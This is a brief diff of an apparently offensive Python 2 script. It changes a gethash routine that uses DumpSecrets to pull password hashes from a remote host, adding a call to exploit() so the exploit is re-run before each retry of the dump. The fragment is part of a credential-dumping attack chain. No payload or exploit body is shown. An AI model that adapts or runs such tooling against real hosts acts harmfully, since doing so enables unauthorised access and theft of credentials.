@@ -126,7 +126,7 @@ def gethash(passargs):
     domain = passargs.domain
     execmethod = passargs.exec_method
     dumper = DumpSecrets(remoteName, username, password, domain,execmethod)
-    tmp = 1
+    tmp = 0
     try:
         check = dumper.dump()
         while tmp < 6:
@@ -135,7 +135,8 @@ def gethash(passargs):
                 #check = dumper.dump()
                 break
             else:
-                time.sleep(5)
+                exploit(passargs)
+                time.sleep(10)
                 check = dumper.dump()
     except Exception, e:
         if logging.getLogger().level == logging.DEBUG:
